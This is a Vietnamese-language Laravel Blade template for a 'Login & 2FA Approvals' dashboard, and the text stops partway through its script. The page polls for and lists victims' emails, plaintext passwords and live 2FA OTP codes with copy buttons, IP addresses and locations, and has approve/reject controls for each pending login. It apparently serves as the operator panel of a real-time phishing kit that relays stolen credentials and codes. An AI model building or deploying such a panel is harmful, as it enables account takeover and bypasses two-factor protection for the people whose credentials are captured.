<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Quản lý Phê duyệt Đăng nhập & 2FA (Login & 2FA Approvals)</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --success: #10b981;
            --success-bg: #ecfdf5;
            --success-border: #a7f3d0;
            --warning: #f59e0b;
            --warning-bg: #fffbeb;
            --warning-border: #fde68a;
            --danger: #ef4444;
            --danger-bg: #fef2f2;
            --danger-border: #fecaca;
            --purple: #8b5cf6;
            --purple-bg: #f5f3ff;
            --purple-border: #ddd6fe;
            --bg-page: #f8fafc;
            --bg-card: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -2px rgba(0, 0, 0, 0.1);
            --radius-md: 10px;
            --radius-sm: 6px;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg-page);
            color: var(--text-main);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            line-height: 1.5;
            min-height: 100vh;
        }

        /* Top Header */
        header {
            background: var(--bg-card);
            border-bottom: 1px solid var(--border-color);
            padding: 18px 32px;
            position: sticky;
            top: 0;
            z-index: 50;
            box-shadow: var(--shadow-sm);
        }

        .header-container {
            max-width: 1440px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }

        .brand-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-icon {
            width: 42px;
            height: 42px;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 20px;
        }

        h1 {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
            letter-spacing: -0.02em;
        }

        .subtitle {
            font-size: 13px;
            color: var(--text-muted);
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .live-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 12px;
            background: #f1f5f9;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            color: #475569;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        /* Main layout */
        main {
            max-width: 1440px;
            margin: 0 auto;
            padding: 24px 32px 48px;
        }

        /* Stat cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            padding: 16px 20px;
            box-shadow: var(--shadow-sm);
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: transform 0.15s ease;
            cursor: pointer;
        }

        .stat-card:hover {
            transform: translateY(-2px);
        }

        .stat-title {
            font-size: 13px;
            font-weight: 500;
            color: var(--text-muted);
            margin-bottom: 4px;
        }

        .stat-value {
            font-size: 24px;
            font-weight: 700;
            color: var(--text-main);
        }

        .stat-icon {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .icon-total { background: #eff6ff; color: #3b82f6; }
        .icon-pending { background: #fffbeb; color: #f59e0b; }
        .icon-login { background: #e0e7ff; color: #4338ca; }
        .icon-2fa { background: #f5f3ff; color: #8b5cf6; }

        /* Filter & Action Toolbar */
        .toolbar {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            padding: 16px;
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 14px;
            box-shadow: var(--shadow-sm);
        }

        .toolbar-left {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            flex: 1;
            min-width: 300px;
        }

        .search-box {
            position: relative;
            flex: 1;
            max-width: 360px;
            min-width: 200px;
        }

        .search-box input {
            width: 100%;
            height: 38px;
            padding: 0 12px 0 36px;
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            font-size: 14px;
            outline: none;
            transition: border-color 0.15s ease, box-shadow 0.15s ease;
        }

        .search-box input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
        }

        .search-icon {
            position: absolute;
            left: 11px;
            top: 50%;
            transform: translateY(-50%);
            color: #94a3b8;
            font-size: 14px;
        }

        .filter-select {
            height: 38px;
            padding: 0 12px;
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            font-size: 13px;
            color: var(--text-main);
            background: #ffffff;
            outline: none;
            cursor: pointer;
        }

        .filter-select:focus {
            border-color: var(--primary);
        }

        .toolbar-right {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            height: 36px;
            padding: 0 14px;
            border-radius: var(--radius-sm);
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.15s ease;
            white-space: nowrap;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }

        .btn-primary { background: var(--primary); color: #ffffff; }
        .btn-primary:hover { background: var(--primary-hover); }

        .btn-outline {
            background: #ffffff;
            border-color: var(--border-color);
            color: #334155;
        }
        .btn-outline:hover { background: #f1f5f9; border-color: #cbd5e1; }

        .btn-danger-outline {
            background: #ffffff;
            border-color: var(--danger-border);
            color: var(--danger);
        }
        .btn-danger-outline:hover { background: var(--danger-bg); }

        .btn-danger { background: var(--danger); color: #ffffff; }
        .btn-danger:hover { background: #dc2626; }

        .btn-success { background: var(--success); color: #ffffff; }
        .btn-success:hover { background: #059669; }

        .btn-sm {
            height: 30px;
            padding: 0 10px;
            font-size: 12px;
        }

        /* Table section */
        .table-container {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-md);
            overflow: hidden;
            box-shadow: var(--shadow-sm);
        }

        .table-responsive {
            width: 100%;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }

        th {
            background: #f8fafc;
            color: #475569;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            padding: 13px 14px;
            border-bottom: 1px solid var(--border-color);
            white-space: nowrap;
        }

        td {
            padding: 13px 14px;
            font-size: 13px;
            border-bottom: 1px solid #f1f5f9;
            vertical-align: middle;
            color: #334155;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background-color: #f8fafc;
        }

        /* Type Badges */
        .type-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
        }

        .type-badge.login {
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #bfdbfe;
        }

        .type-badge.twofa {
            background: var(--purple-bg);
            color: #6d28d9;
            border: 1px solid var(--purple-border);
        }

        /* Table custom cell elements */
        .email-cell {
            font-weight: 600;
            color: #0f172a;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .password-cell {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: #f8fafc;
            padding: 3px 6px;
            border-radius: 4px;
            border: 1px solid #e2e8f0;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 12px;
        }

        .password-text {
            user-select: all;
            color: #0f172a;
            font-weight: 600;
        }

        .code-cell {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: #fdf4ff;
            padding: 3px 8px;
            border-radius: 6px;
            border: 1px solid #f0abfc;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 13px;
            font-weight: 700;
            color: #a21caf;
        }

        .copy-btn {
            background: transparent;
            border: none;
            cursor: pointer;
            font-size: 13px;
            padding: 2px 3px;
            border-radius: 4px;
            display: inline-flex;
            align-items: center;
            color: #64748b;
            transition: color 0.15s ease;
        }

        .copy-btn:hover {
            color: #1e293b;
            background: #e2e8f0;
        }

        .ip-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 6px;
            background: #f1f5f9;
            border-radius: 4px;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 12px;
            color: #334155;
            border: 1px solid #e2e8f0;
        }

        .location-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            color: #475569;
            font-size: 12px;
        }

        .time-cell {
            color: #64748b;
            font-size: 12px;
            white-space: nowrap;
        }

        .badge-status {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 4px 9px;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 600;
            text-transform: capitalize;
        }

        .badge-status.pending {
            background: var(--warning-bg);
            color: #b45309;
            border: 1px solid var(--warning-border);
        }

        .badge-status.approved {
            background: var(--success-bg);
            color: #047857;
            border: 1px solid var(--success-border);
        }

        .badge-status.rejected {
            background: var(--danger-bg);
            color: #b91c1c;
            border: 1px solid var(--danger-border);
        }

        .row-actions {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        /* Pagination & Footer */
        .table-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 20px;
            background: #ffffff;
            border-top: 1px solid var(--border-color);
            flex-wrap: wrap;
            gap: 12px;
        }

        .pagination-info {
            font-size: 13px;
            color: var(--text-muted);
        }

        .pagination-controls {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .page-btn {
            min-width: 32px;
            height: 32px;
            padding: 0 8px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid var(--border-color);
            background: #ffffff;
            border-radius: var(--radius-sm);
            font-size: 13px;
            font-weight: 500;
            color: #334155;
            cursor: pointer;
            transition: all 0.15s ease;
        }

        .page-btn:hover:not(:disabled) {
            background: #f1f5f9;
            border-color: #cbd5e1;
        }

        .page-btn.active {
            background: var(--primary);
            border-color: var(--primary);
            color: #ffffff;
            font-weight: 600;
        }

        .page-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        /* Empty state */
        .empty-state {
            text-align: center;
            padding: 56px 20px;
            color: var(--text-muted);
        }

        .empty-icon {
            font-size: 40px;
            margin-bottom: 12px;
            color: #cbd5e1;
        }

        /* Toast notification */
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            padding: 12px 18px;
            background: #1e293b;
            color: #ffffff;
            border-radius: var(--radius-sm);
            font-size: 13px;
            font-weight: 500;
            box-shadow: var(--shadow-md);
            z-index: 1000;
            opacity: 0;
            transform: translateY(10px);
            transition: all 0.2s ease;
            pointer-events: none;
        }

        .toast.show {
            opacity: 1;
            transform: translateY(0);
        }

        /* Checkbox styling */
        input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: var(--primary);
        }

        /* Responsive */
        @media (max-width: 768px) {
            header, main {
                padding-left: 16px;
                padding-right: 16px;
            }
            .toolbar {
                flex-direction: column;
                align-items: stretch;
            }
            .toolbar-left, .toolbar-right {
                width: 100%;
                justify-content: space-between;
            }
            .search-box {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <header>
        <div class="header-container">
            <div class="brand-info">
                <div class="brand-icon">🛡️</div>
                <div>
                    <h1>Quản lý Duyệt Đăng nhập & Xác thực 2FA</h1>
                    <div class="subtitle">Bảng điều khiển quản trị phê duyệt Mật khẩu & Mã 2FA thời gian thực</div>
                </div>
            </div>
            <div class="header-actions">
                <div class="live-badge">
                    <div class="pulse-dot"></div>
                    <span id="sync-status">Đang đồng bộ</span>
                </div>
                <button class="btn btn-outline btn-sm" onclick="toggleAutoRefresh()" id="btn-toggle-refresh">
                    ⏸️ Tạm dừng
                </button>
            </div>
        </div>
    </header>

    <main>
        <!-- Stat summary cards -->
        <div class="stats-grid">
            <div class="stat-card" onclick="resetFilters()">
                <div>
                    <div class="stat-title">Tổng số yêu cầu</div>
                    <div class="stat-value" id="count-total">0</div>
                </div>
                <div class="stat-icon icon-total">📋</div>
            </div>
            <div class="stat-card" onclick="setStatusFilter('pending')">
                <div>
                    <div class="stat-title">Chờ duyệt (Pending)</div>
                    <div class="stat-value" id="count-pending">0</div>
                </div>
                <div class="stat-icon icon-pending">⏳</div>
            </div>
            <div class="stat-card" onclick="setTypeFilter('login')">
                <div>
                    <div class="stat-title">Đăng nhập (Mật khẩu)</div>
                    <div class="stat-value" id="count-login">0</div>
                </div>
                <div class="stat-icon icon-login">🔑</div>
            </div>
            <div class="stat-card" onclick="setTypeFilter('2fa')">
                <div>
                    <div class="stat-title">Xác thực 2FA (Mã OTP)</div>
                    <div class="stat-value" id="count-2fa">0</div>
                </div>
                <div class="stat-icon icon-2fa">🔐</div>
            </div>
        </div>

        <!-- Filter & Actions Toolbar -->
        <div class="toolbar">
            <div class="toolbar-left">
                <div class="search-box">
                    <span class="search-icon">🔍</span>
                    <input type="text" id="search-input" placeholder="Tìm Email, Mật khẩu, Mã 2FA, IP..." oninput="handleSearch(this.value)">
                </div>

                <select class="filter-select" id="type-filter" onchange="handleTypeChange(this.value)">
                    <option value="all">Tất cả loại (MK + 2FA)</option>
                    <option value="login">Chỉ Đăng nhập (Mật khẩu)</option>
                    <option value="2fa">Chỉ Xác thực 2FA (Mã OTP)</option>
                </select>

                <select class="filter-select" id="status-filter" onchange="handleStatusChange(this.value)">
                    <option value="all">Tất cả trạng thái</option>
                    <option value="pending">Chờ duyệt (Pending)</option>
                    <option value="approved">Đã duyệt (Approved)</option>
                    <option value="rejected">Từ chối (Rejected)</option>
                </select>

                <select class="filter-select" id="page-size-select" onchange="handlePageSizeChange(this.value)">
                    <option value="10">10 dòng / trang</option>
                    <option value="20" selected>20 dòng / trang</option>
                    <option value="50">50 dòng / trang</option>
                    <option value="100">100 dòng / trang</option>
                </select>
            </div>

            <div class="toolbar-right">
                <button class="btn btn-danger-outline btn-sm" id="btn-bulk-delete" style="display: none;" onclick="deleteSelected()">
                    🗑️ Xóa đã chọn (<span id="selected-count">0</span>)
                </button>
                <button class="btn btn-danger-outline btn-sm" onclick="confirmClearAll()">
                    🧹 Xóa tất cả data
                </button>
                <button class="btn btn-outline btn-sm" onclick="refreshData(true)">
                    🔄 Làm mới
                </button>
            </div>
        </div>

        <!-- Table Container -->
        <div class="table-container">
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th style="width: 36px; text-align: center;">
                                <input type="checkbox" id="select-all" onchange="toggleSelectAll(this.checked)">
                            </th>
                            <th style="width: 150px;">Thời gian</th>
                            <th style="width: 110px;">Loại</th>
                            <th>Email (Tài khoản)</th>
                            <th>Mật khẩu</th>
                            <th>Mã 2FA (OTP)</th>
                            <th>Địa chỉ IP</th>
                            <th>Vị trí</th>
                            <th style="width: 110px;">Trạng thái</th>
                            <th style="width: 210px; text-align: right;">Thao tác</th>
                        </tr>
                    </thead>
                    <tbody id="table-rows">
                        <!-- Dynamic rendered rows -->
                    </tbody>
                </table>
            </div>

            <!-- Footer & Pagination -->
            <div class="table-footer">
                <div class="pagination-info" id="pagination-info">
                    Hiển thị 0 bản ghi
                </div>
                <div class="pagination-controls" id="pagination-controls">
                    <!-- Pagination buttons rendered here -->
                </div>
            </div>
        </div>
    </main>

    <div id="toast" class="toast">Thông báo</div>

    <script>
        const csrf = document.querySelector('meta[name="csrf-token"]').content;
        const listUrl = @json($listUrl);
        const tokenQuery = @json($tokenQuery);

        // State variables
        let rawData = @json($approvals) || [];
        let filteredData = [];
        let searchQuery = '';
        let selectedStatus = 'all';
        let selectedType = 'all';
        let currentPage = 1;
        let pageSize = 20;
        let selectedIds = new Set();
        let revealedPasswords = new Set();
        let autoRefreshActive = true;
        let refreshTimer = null;

        function tokenSuffix() {
            const query = new URLSearchParams(tokenQuery);
            const suffix = query.toString();
            return suffix ? `?${suffix}` : '';
        }

        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2500);
        }

        function escapeHtml(value) {
            return String(value ?? '').replace(/[&<>"']/g, (char) => ({
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            }[char]));
        }

        function formatDateTime(isoString) {
            if (!isoString) return '—';
            try {
                const date = new Date(isoString);
                if (isNaN(date.getTime())) return isoString;
                return date.toLocaleString('vi-VN', {
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    hour12: false
                });
            } catch (e) {
                return isoString;
            }
        }

        function updateStats() {
            let total = rawData.length;
            let pending = 0;
            let loginCount = 0;
            let twofaCount = 0;

            rawData.forEach(item => {
                if (item.status === 'pending') pending++;
                if (item.type === '2fa') twofaCount++;
                else loginCount++;
            });

            document.getElementById('count-total').textContent = total;
            document.getElementById('count-pending').textContent = pending;
            document.getElementById('count-login').textContent = loginCount;
            document.getElementById('count-2fa').textContent = twofaCount;
        }

        function applyFilter() {
            filteredData = rawData.filter(item => {
                // Status filter
                if (selectedStatus !== 'all' && item.status !== selectedStatus) {
                    return false;
                }

                // Type filter (login / 2fa)
                const itemType = item.type || 'login';
                if (selectedType !== 'all' && itemType !== selectedType) {
                    return false;
                }

                // Search query (Email, Password, Code, IP, Location)
                if (searchQuery.trim() !== '') {
                    const q = searchQuery.toLowerCase().trim();
                    const emailMatch = (item.email || '').toLowerCase().includes(q);
                    const passwordMatch = (item.password || '').toLowerCase().includes(q);
                    const codeMatch = (item.code || '').toLowerCase().includes(q);
                    const ipMatch = (item.ip || '').toLowerCase().includes(q);
                    const locationMatch = (item.location || '').toLowerCase().includes(q);
                    return emailMatch || passwordMatch || codeMatch || ipMatch || locationMatch;
                }

                return true;
            });

            // Adjust currentPage if out of range
            const maxPages = Math.ceil(filteredData.length / pageSize) || 1;
            if (currentPage > maxPages) {
                currentPage = maxPages;
            }

            renderTable();
            renderPagination();
            updateBulkDeleteButton();
        }

        function togglePassword(id) {
            if (revealedPasswords.has(id)) {
                revealedPasswords.delete(id);
            } else {
                revealedPasswords.add(id);
            }
            renderTable();
        }

        function copyToClipboard(text, label) {
            if (!text) return;
            navigator.clipboard.writeText(text).then(() => {
                showToast(`Đã sao chép ${label || 'nội dung'}!`);
            }).catch(() => {
                showToast('Không thể sao chép vào bộ nhớ tạm!');
            });
        }

        function renderTable() {
            const tbody = document.getElementById('table-rows');
            if (filteredData.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="10">
                            <div class="empty-state">
                                <div class="empty-icon">📭</div>
                                <div style="font-weight:600; font-size: 15px; color:#475569; margin-bottom:4px;">Không tìm thấy dữ liệu</div>
                                <div style="font-size: 13px;">Chưa có yêu cầu nào phù hợp với bộ lọc hiện tại.</div>
                            </div>
                        </td>
                    </tr>
                `;
                return;
            }

            const startIndex = (currentPage - 1) * pageSize;
            const pageItems = filteredData.slice(startIndex, startIndex + pageSize);

            tbody.innerHTML = pageItems.map(item => {
                const isPending = item.status === 'pending';
                const isChecked = selectedIds.has(item.id) ? 'checked' : '';
                const isRevealed = revealedPasswords.has(item.id);
                const is2FA = item.type === '2fa';
                
                let statusLabel = 'Chờ duyệt';
                if (item.status === 'approved') statusLabel = 'Đã duyệt';
                if (item.status === 'rejected') statusLabel = 'Đã từ chối';

                const location = item.location || 'Localhost';
                const rawPassword = item.password || '';
                const displayPassword = isRevealed ? escapeHtml(rawPassword) : (rawPassword ? '••••••••' : '—');
                const rawCode = item.code || '';

                return `
                    <tr>
                        <td style="text-align: center;">
                            <input type="checkbox" ${isChecked} onchange="toggleSelect('${escapeHtml(item.id)}', this.checked)">
                        </td>
                        <td class="time-cell">
                            🕒 ${escapeHtml(formatDateTime(item.createdAt))}
                        </td>
                        <td>
                            ${is2FA ? `
                                <span class="type-badge twofa">🔐 Mã 2FA</span>
                            ` : `
                                <span class="type-badge login">🏷️ Đăng nhập</span>
                            `}
                        </td>
                        <td>
                            <div class="email-cell">
                                ✉️ <span>${escapeHtml(item.email)}</span>
                            </div>
                        </td>
                        <td>
                            ${rawPassword && rawPassword !== 'N/A' ? `
                                <div class="password-cell">
                                    🔑 <span class="password-text">${displayPassword}</span>
                                    <button class="copy-btn" title="${isRevealed ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}" onclick="togglePassword('${escapeHtml(item.id)}')">
                                        ${isRevealed ? '🙈' : '👁️'}
                                    </button>
                                    <button class="copy-btn" title="Sao chép mật khẩu" onclick="copyToClipboard('${escapeHtml(rawPassword)}', 'mật khẩu')">
                                        📋
                                    </button>
                                </div>
                            ` : `<span style="color:#94a3b8;">—</span>`}
                        </td>
                        <td>
                            ${rawCode ? `
                                <div class="code-cell">
                                    <span>${escapeHtml(rawCode)}</span>
                                    <button class="copy-btn" title="Sao chép mã 2FA" onclick="copyToClipboard('${escapeHtml(rawCode)}', 'mã 2FA')">
                                        📋
                                    </button>
                                </div>
                            ` : `<span style="color:#94a3b8;">—</span>`}
                        </td>
                        <td>
                            <span class="ip-badge">🌐 ${escapeHtml(item.ip)}</span>
                        </td>
                        <td>
                            <span class="location-badge">📍 ${escapeHtml(location)}</span>
                        </td>
                        <td>
                            <span class="badge-status ${escapeHtml(item.status)}">${escapeHtml(statusLabel)}</span>
                        </td>
                        <td style="text-align: right;">
                            <div class="row-actions" style="justify-content: flex-end;">
                                <button class="btn btn-success btn-sm" ${!isPending ? 'disabled' : ''} onclick="decide('${escapeHtml(item.id)}', 'approve')">
                                    ✓ Duyệt
                                </button>
                                <button class="btn btn-danger-outline btn-sm" ${!isPending ? 'disabled' : ''} onclick="decide('${escapeHtml(item.id)}', 'reject')">
                                    ✕ Từ chối
                                </button>
                                <button class="btn btn-outline btn-sm" title="Xóa bản ghi này" onclick="deleteSingle('${escapeHtml(item.id)}')">
                                    🗑️
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
            }).join('');

            // Sync master checkbox state
            const allCurrentChecked = pageItems.length > 0 && pageItems.every(i => selectedIds.has(i.id));
            document.getElementById('select-all').checked = allCurrentChecked;
        }

        function renderPagination() {
            const total = filteredData.length;
            const paginationInfo = document.getElementById('pagination-info');
            const paginationControls = document.getElementById('pagination-controls');

            if (total === 0) {
                paginationInfo.textContent = 'Hiển thị 0 bản ghi';
                paginationControls.innerHTML = '';
                return;
            }

            const totalPages = Math.ceil(total / pageSize);
            const start = (currentPage - 1) * pageSize + 1;
            const end = Math.min(currentPage * pageSize, total);

            paginationInfo.innerHTML = `Hiển thị <strong>${start} - ${end}</strong> trên tổng số <strong>${total}</strong> bản ghi`;

            let buttons = [];

            // Prev Button
            buttons.push(`
                <button class="page-btn" ${currentPage === 1 ? 'disabled' : ''} onclick="goToPage(${currentPage - 1})">‹</button>
            `);

            // Page numbers
            let startPage = Math.max(1, currentPage - 2);
            let endPage = Math.min(totalPages, startPage + 4);
            if (endPage - startPage < 4) {
                startPage = Math.max(1, endPage - 4);
            }

            if (startPage > 1) {
                buttons.push(`<button class="page-btn" onclick="goToPage(1)">1</button>`);
                if (startPage > 2) buttons.push(`<span style="padding:0 4px; color:#94a3b8;">...</span>`);
            }

            for (let p = startPage; p <= endPage; p++) {
                buttons.push(`
                    <button class="page-btn ${p === currentPage ? 'active' : ''}" onclick="goToPage(${p})">${p}</button>
                `);
            }

            if (endPage < totalPages) {
                if (endPage < totalPages - 1) buttons.push(`<span style="padding:0 4px; color:#94a3b8;">...</span>`);
                buttons.push(`<button class="page-btn" onclick="goToPage(${totalPages})">${totalPages}</button>`);
            }

            // Next Button
            buttons.push(`
                <button class="page-btn" ${currentPage === totalPages ? 'disabled' : ''} onclick="goToPage(${currentPage + 1})">›</button>
            `);

            paginationControls.innerHTML = buttons.join('');
        }

        function goToPage(page) {
            currentPage = page;
            renderTable();
            renderPagination();
        }

        function handleSearch(query) {
            searchQuery = query;
            currentPage = 1;
            applyFilter();
        }

        function handleTypeChange(type) {
            selectedType = type;
            currentPage = 1;
            applyFilter();
        }

        function handleStatusChange(status) {
            selectedStatus = status;
            currentPage = 1;
            applyFilter();
        }

        function setTypeFilter(type) {
            document.getElementById('type-filter').value = type;
            handleTypeChange(type);
        }

        function setStatusFilter(status) {
            document.getElementById('status-filter').value = status;
            handleStatusChange(status);
        }

        function resetFilters() {
            document.getElementById('type-filter').value = 'all';
            document.getElementById('status-filter').value = 'all';
            document.getElementById('search-input').value = '';
            searchQuery = '';
            selectedType = 'all';
            selectedStatus = 'all';
            currentPage = 1;
            applyFilter();
        }

        function handlePageSizeChange(size) {
            pageSize = parseInt(size, 10) || 20;
            currentPage = 1;
            applyFilter();
        }

        function toggleSelect(id, checked) {
            if (checked) {
                selectedIds.add(id);
            } else {
                selectedIds.delete(id);
            }
            updateBulkDeleteButton();
            renderTable();
        }

        function toggleSelectAll(checked) {
            const startIndex = (currentPage - 1) * pageSize;
            const pageItems = filteredData.slice(startIndex, startIndex + pageSize);

            pageItems.forEach(item => {
                if (checked) {
                    selectedIds.add(item.id);
                } else {
                    selectedIds.delete(item.id);
                }
            });

            updateBulkDeleteButton();
            renderTable();
        }

        function updateBulkDeleteButton() {
            const bulkBtn = document.getElementById('btn-bulk-delete');
            const countSpan = document.getElementById('selected-count');
            if (selectedIds.size > 0) {
                bulkBtn.style.display = 'inline-flex';
                countSpan.textContent = selectedIds.size;
            } else {
                bulkBtn.style.display = 'none';
            }
        }

        // Actions
        async function decide(id, action) {
            try {
                const response = await fetch(`/admin/login-approvals/${id}/${action}${tokenSuffix()}`, {
                    method: 'POST',
                    headers: {
                        'X-CSRF-TOKEN': csrf,
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    showToast(action === 'approve' ? 'Đã duyệt yêu cầu thành công!' : 'Đã từ chối yêu cầu!');
                    await refreshData(false);
                } else {
                    showToast('Lỗi khi thực hiện thao tác!');
                }
            } catch (e) {
                console.error(e);
                showToast('Lỗi kết nối!');
            }
        }

        async function deleteSingle(id) {
            if (!confirm('Bạn có chắc chắn muốn xóa bản ghi này không?')) return;

            try {
                const response = await fetch(`/admin/login-approvals/${id}/delete${tokenSuffix()}`, {
                    method: 'POST',
                    headers: {
                        'X-CSRF-TOKEN': csrf,
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    selectedIds.delete(id);
                    revealedPasswords.delete(id);
                    showToast('Đã xóa bản ghi thành công!');
                    await refreshData(false);
                } else {
                    showToast('Không thể xóa bản ghi!');
                }
            } catch (e) {
                console.error(e);
                showToast('Lỗi kết nối!');
            }
        }

        async function deleteSelected() {
            if (selectedIds.size === 0) return;
            if (!confirm(`Bạn có chắc chắn muốn xóa ${selectedIds.size} bản ghi đã chọn không?`)) return;

            try {
                const response = await fetch(`/admin/login-approvals-bulk-delete${tokenSuffix()}`, {
                    method: 'POST',
                    headers: {
                        'X-CSRF-TOKEN': csrf,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ ids: Array.from(selectedIds) })
                });

                if (response.ok) {
                    selectedIds.clear();
                    showToast('Đã xóa các bản ghi đã chọn thành công!');
                    await refreshData(false);
                } else {
                    showToast('Lỗi khi xóa nhiều bản ghi!');
                }
            } catch (e) {
                console.error(e);
                showToast('Lỗi kết nối!');
            }
        }

        async function confirmClearAll() {
            if (!confirm('CẢNH BÁO: Thao tác này sẽ xóa toàn bộ dữ liệu yêu cầu đăng nhập & 2FA. Bạn có chắc muốn tiếp tục không?')) return;

            try {
                const response = await fetch(`/admin/login-approvals-clear${tokenSuffix()}`, {
                    method: 'POST',
                    headers: {
                        'X-CSRF-TOKEN': csrf,
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    selectedIds.clear();
                    revealedPasswords.clear();
                    rawData = [];
                    updateStats();
                    applyFilter();
                    showToast('Đã xóa toàn bộ dữ liệu!');
                } else {
                    showToast('Không thể xóa toàn bộ dữ liệu!');
                }
            } catch (e) {
                console.error(e);
                showToast('Lỗi kết nối!');
            }
        }

        async function refreshData(manual = false) {
            try {
                const response = await fetch(listUrl, {
                    headers: { 'Accept': 'application/json' }
                });

                if (response.ok) {
                    const data = await response.json();
                    rawData = data || [];
                    updateStats();
                    applyFilter();

                    if (manual) {
                        showToast('Đã làm mới dữ liệu!');
                    }
                }
            } catch (error) {
                console.warn('Could not refresh approvals', error);
            }
        }

        function toggleAutoRefresh() {
            autoRefreshActive = !autoRefreshActive;
            const btn = document.getElementById('btn-toggle-refresh');
            const syncStatus = document.getElementById('sync-status');

            if (autoRefreshActive) {
                btn.innerHTML = '⏸️ Tạm dừng';
                syncStatus.textContent = 'Đang đồng bộ';
                startPolling();
                showToast('Đã bật tự động làm mới');
            } else {
                btn.innerHTML = '▶️ Tiếp tục';
                syncStatus.textContent = 'Đã tạm dừng';
                clearInterval(refreshTimer);
                showToast('Đã tạm dừng tự động làm mới');
            }
        }

